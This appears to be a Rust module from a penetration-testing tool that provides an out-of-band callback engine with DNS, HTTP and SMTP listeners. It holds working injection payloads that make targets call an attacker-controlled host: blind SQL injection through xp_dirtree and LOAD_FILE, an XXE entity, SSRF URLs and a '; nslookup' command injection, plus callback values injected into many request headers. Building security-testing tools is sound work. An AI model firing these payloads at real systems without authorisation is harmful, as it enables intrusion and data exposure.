use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::OnceLock;
use tokio::sync::Mutex;

/// WonderSuite OAST (Out-of-Band Application Security Testing) Engine
/// Equivalent to Burp Suite Collaborator / Interactsh
///
/// Provides:
/// - Unique payload generation with correlation IDs
/// - DNS/HTTP/SMTP callback URL creation
/// - DNS callback server (UDP port 53 listener)
/// - HTTP callback server (Axum-based)
/// - SMTP callback server (basic MX listener)
/// - Collaborator Everywhere: auto-inject OAST headers
/// - Vuln-type specific payload templates

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OastPayload {
    pub id: String,
    pub correlation_id: String,
    pub subdomain: String,
    pub full_url: String,
    pub dns_payload: String,
    pub http_payload: String,
    pub smtp_payload: String,
    pub created_at: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OastInteraction {
    pub id: String,
    pub correlation_id: String,
    pub interaction_type: String,  // "dns", "http", "smtp"
    pub source_ip: String,
    pub timestamp: String,
    pub raw_data: String,
    pub details: HashMap<String, String>,
}

/// Global interaction store
pub static INTERACTIONS: OnceLock<Mutex<Vec<OastInteraction>>> = OnceLock::new();

pub fn get_interactions() -> &'static Mutex<Vec<OastInteraction>> {
    INTERACTIONS.get_or_init(|| Mutex::new(Vec::new()))
}

/// Generate a unique OAST payload with correlation ID
pub fn generate_oast_payload(description: &str, server_domain: &str) -> OastPayload {
    let correlation_id = generate_random_string(16);
    let random_part = generate_random_string(12);
    let subdomain = format!("{}.{}.{}", random_part, correlation_id, server_domain);
    
    OastPayload {
        id: uuid::Uuid::new_v4().to_string(),
        correlation_id: correlation_id.clone(),
        subdomain: subdomain.clone(),
        full_url: format!("http://{}", subdomain),
        dns_payload: subdomain.clone(),
        http_payload: format!("http://{}/", subdomain),
        smtp_payload: format!("oast-{}@{}", correlation_id, server_domain),
        created_at: chrono_now(),
        description: description.to_string(),
    }
}

/// Generate payloads for different vulnerability types
pub fn generate_oast_payloads_for_scan(target: &str, server_domain: &str) -> Vec<(String, String, OastPayload)> {
    let mut payloads = Vec::new();
    
    let sqli_oast = generate_oast_payload(&format!("Blind SQLi on {}", target), server_domain);
    payloads.push(("sqli".into(), format!(
        "'; EXEC xp_dirtree '//{}'--", sqli_oast.subdomain
    ), sqli_oast));
    
    let sqli_oast2 = generate_oast_payload(&format!("Blind SQLi LOAD_FILE on {}", target), server_domain);
    payloads.push(("sqli".into(), format!(
        "' UNION SELECT LOAD_FILE('//{}/a')--", sqli_oast2.subdomain
    ), sqli_oast2));
    
    let ssrf_oast = generate_oast_payload(&format!("Blind SSRF on {}", target), server_domain);
    payloads.push(("ssrf".into(), ssrf_oast.http_payload.clone(), ssrf_oast));
    
    let xxe_oast = generate_oast_payload(&format!("Blind XXE on {}", target), server_domain);
    payloads.push(("xxe".into(), format!(
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{}\">]><foo>&xxe;</foo>",
        xxe_oast.http_payload
    ), xxe_oast));
    
    let cmd_oast = generate_oast_payload(&format!("Blind CmdInj on {}", target), server_domain);
    payloads.push(("command_injection".into(), format!(
        "; nslookup {} #", cmd_oast.subdomain
    ), cmd_oast));
    
    payloads
}

/// Collaborator Everywhere — headers to auto-inject into every outgoing request
pub fn collaborator_everywhere_headers(server_domain: &str) -> Vec<(String, String, OastPayload)> {
    let headers_to_inject = vec![
        "Referer", "Origin", "X-Forwarded-For", "X-Forwarded-Host",
        "X-Original-URL", "X-Wap-Profile", "Contact", "From",
        "True-Client-IP", "Client-IP", "Forwarded", "X-Client-IP",
        "X-Real-IP", "CF-Connecting-IP",
    ];
    
    headers_to_inject.into_iter().map(|header| {
        let payload = generate_oast_payload(
            &format!("Collaborator Everywhere: {}", header),
            server_domain,
        );
        let inject_value = if header == "Referer" || header == "Origin" || header == "X-Wap-Profile" {
            payload.http_payload.clone()
        } else if header == "From" || header == "Contact" {
            payload.smtp_payload.clone()
        } else {
            payload.subdomain.clone()
        };
        (header.to_string(), inject_value, payload)
    }).collect()
}

/// Start DNS callback server on specified port
pub async fn start_dns_server(port: u16) -> Result<(), String> {
    use tokio::net::UdpSocket;
    
    let socket = UdpSocket::bind(format!("0.0.0.0:{}", port))
        .await
        .map_err(|e| format!("Failed to bind DNS port {}: {}", port, e))?;
    
    println!("[OAST] DNS callback server started on port {}", port);
    
    tokio::spawn(async move {
        let mut buf = [0u8; 512];
        loop {
            match socket.recv_from(&mut buf).await {
                Ok((len, src)) => {
                    // Parse DNS query to extract queried domain
                    if let Some(domain) = parse_dns_query(&buf[..len]) {
                        println!("[OAST-DNS] Query from {}: {}", src, domain);
                        
                        // Try to extract correlation_id from subdomain
                        let parts: Vec<&str> = domain.split('.').collect();
                        let correlation_id = if parts.len() >= 3 {
                            parts[1].to_string()
                        } else {
                            "unknown".to_string()
                        };
                        
                        let interaction = OastInteraction {
                            id: uuid::Uuid::new_v4().to_string(),
                            correlation_id,
                            interaction_type: "dns".into(),
                            source_ip: src.to_string(),
                            timestamp: chrono_now(),
                            raw_data: format!("DNS Query: {}", domain),
                            details: {
                                let mut d = HashMap::new();
                                d.insert("queried_domain".into(), domain.clone());
                                d.insert("query_type".into(), "A".into());
                                d.insert("raw_length".into(), len.to_string());
                                d
                            },
                        };
                        
                        let store = get_interactions();
                        store.lock().await.push(interaction);
                        
                        // Send minimal DNS response pointing to 127.0.0.1
                        if len >= 12 {
                            let mut resp = buf[..len].to_vec();
                            resp[2] = 0x81; // Response flags: QR=1, AA=1
                            resp[3] = 0x80;
                            resp[6] = 0x00; resp[7] = 0x01; // ANCOUNT = 1
                            // Append answer: pointer to question, type A, class IN, TTL=60, rdlength=4, 127.0.0.1
                            resp.extend_from_slice(&[0xC0, 0x0C]); // Name pointer
                            resp.extend_from_slice(&[0x00, 0x01]); // Type A
                            resp.extend_from_slice(&[0x00, 0x01]); // Class IN
                            resp.extend_from_slice(&[0x00, 0x00, 0x00, 0x3C]); // TTL 60
                            resp.extend_from_slice(&[0x00, 0x04]); // RDLENGTH 4
                            resp.extend_from_slice(&[127, 0, 0, 1]); // 127.0.0.1
                            let _ = socket.send_to(&resp, src).await;
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[OAST-DNS] Error: {}", e);
                }
            }
        }
    });
    
    Ok(())
}

/// Start HTTP callback server
pub async fn start_http_callback_server(port: u16) -> Result<(), String> {
    use axum::{extract::ConnectInfo, routing::any, Router, response::IntoResponse};
    use std::net::SocketAddr;
    
    let app = Router::new().route("/{*path}", any(|
        ConnectInfo(addr): ConnectInfo<SocketAddr>,
        req: axum::extract::Request,
    | async move {
        let path = req.uri().path().to_string();
        let method = req.method().to_string();
        let headers: HashMap<String, String> = req.headers().iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        
        // Extract correlation from subdomain or path
        let host = headers.get("host").cloned().unwrap_or_default();
        let parts: Vec<&str> = host.split('.').collect();
        let correlation_id = if parts.len() >= 3 {
            parts[1].to_string()
        } else if path.len() > 1 {
            path.trim_start_matches('/').split('/').next().unwrap_or("unknown").to_string()
        } else {
            "unknown".to_string()
        };
        
        println!("[OAST-HTTP] {} {} from {} (corr: {})", method, path, addr, correlation_id);
        
        let interaction = OastInteraction {
            id: uuid::Uuid::new_v4().to_string(),
            correlation_id,
            interaction_type: "http".into(),
            source_ip: addr.to_string(),
            timestamp: chrono_now(),
            raw_data: format!("{} {} HTTP/1.1\nHost: {}", method, path, host),
            details: {
                let mut d = HashMap::new();
                d.insert("method".into(), method);
                d.insert("path".into(), path);
                d.insert("host".into(), host);
                for (k, v) in &headers {
                    d.insert(format!("header_{}", k), v.clone());
                }
                d
            },
        };
        
        let store = get_interactions();
        store.lock().await.push(interaction);
        
        "OAST callback received"
    }));
    
    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    let listener = tokio::net::TcpListener::bind(addr)
        .await
        .map_err(|e| format!("Failed to bind HTTP port {}: {}", port, e))?;
    
    println!("[OAST] HTTP callback server started on port {}", port);
    
    tokio::spawn(async move {
        let _ = axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>()).await;
    });
    
    Ok(())
}

/// Start SMTP callback server (basic)
pub async fn start_smtp_server(port: u16) -> Result<(), String> {
    use tokio::net::TcpListener;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    
    let listener = TcpListener::bind(format!("0.0.0.0:{}", port))
        .await
        .map_err(|e| format!("Failed to bind SMTP port {}: {}", port, e))?;
    
    println!("[OAST] SMTP callback server started on port {}", port);
    
    tokio::spawn(async move {
        loop {
            if let Ok((mut stream, addr)) = listener.accept().await {
                tokio::spawn(async move {
                    let banner = b"220 oast.wondersuite.local ESMTP WonderSuite OAST\r\n";
                    let _ = stream.write_all(banner).await;
                    
                    let mut buf = [0u8; 1024];
                    let mut mail_from = String::new();
                    let mut rcpt_to = String::new();
                    let mut data = String::new();
                    let mut in_data = false;
                    
                    loop {
                        match stream.read(&mut buf).await {
                            Ok(0) => break,
                            Ok(n) => {
                                let line = String::from_utf8_lossy(&buf[..n]).to_string();
                                
                                if in_data {
                                    if line.contains("\r\n.\r\n") || line.trim() == "." {
                                        in_data = false;
                                        let _ = stream.write_all(b"250 OK\r\n").await;
                                        
                                        // Extract correlation from RCPT TO address
                                        let correlation_id = rcpt_to
                                            .split("oast-").nth(1)
                                            .and_then(|s| s.split('@').next())
                                            .unwrap_or("unknown")
                                            .to_string();
                                        
                                        println!("[OAST-SMTP] Email from {} via {} (corr: {})", 
                                            mail_from, addr, correlation_id);
                                        
                                        let interaction = OastInteraction {
                                            id: uuid::Uuid::new_v4().to_string(),
                                            correlation_id,
                                            interaction_type: "smtp".into(),
                                            source_ip: addr.to_string(),
                                            timestamp: chrono_now(),
                                            raw_data: format!("MAIL FROM: {}\nRCPT TO: {}\nDATA:\n{}", 
                                                mail_from, rcpt_to, data),
                                            details: {
                                                let mut d = HashMap::new();
                                                d.insert("mail_from".into(), mail_from.clone());
                                                d.insert("rcpt_to".into(), rcpt_to.clone());
                                                d
                                            },
                                        };
                                        
                                        let store = get_interactions();
                                        store.lock().await.push(interaction);
                                    } else {
                                        data.push_str(&line);
                                    }
                                    continue;
                                }
                                
                                let upper = line.to_uppercase();
                                if upper.starts_with("HELO") || upper.starts_with("EHLO") {
                                    let _ = stream.write_all(b"250 Hello\r\n").await;
                                } else if upper.starts_with("MAIL FROM:") {
                                    mail_from = line[10..].trim().to_string();
                                    let _ = stream.write_all(b"250 OK\r\n").await;
                                } else if upper.starts_with("RCPT TO:") {
                                    rcpt_to = line[8..].trim().to_string();
                                    let _ = stream.write_all(b"250 OK\r\n").await;
                                } else if upper.starts_with("DATA") {
                                    in_data = true;
                                    let _ = stream.write_all(b"354 Start mail input\r\n").await;
                                } else if upper.starts_with("QUIT") {
                                    let _ = stream.write_all(b"221 Bye\r\n").await;
                                    break;
                                } else {
                                    let _ = stream.write_all(b"250 OK\r\n").await;
                                }
                            }
                            Err(_) => break,
                        }
                    }
                });
            }
        }
    });
    
    Ok(())
}

/// Parse a DNS query packet to extract the queried domain name
fn parse_dns_query(packet: &[u8]) -> Option<String> {
    if packet.len() < 12 { return None; }
    
    let mut pos = 12; // Skip header
    let mut domain_parts = Vec::new();
    
    loop {
        if pos >= packet.len() { break; }
        let label_len = packet[pos] as usize;
        if label_len == 0 { break; }
        pos += 1;
        if pos + label_len > packet.len() { break; }
        if let Ok(label) = std::str::from_utf8(&packet[pos..pos + label_len]) {
            domain_parts.push(label.to_string());
        }
        pos += label_len;
    }
    
    if domain_parts.is_empty() { None } else { Some(domain_parts.join(".")) }
}

fn generate_random_string(len: usize) -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
    let chars = b"abcdefghijklmnopqrstuvwxyz0123456789";
    (0..len).map(|i| {
        let idx = ((seed >> (i * 3)) as usize + i * 13 + (seed as usize % 37)) % chars.len();
        chars[idx] as char
    }).collect()
}

fn chrono_now() -> String {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    format!("{}Z", now.as_secs())
}
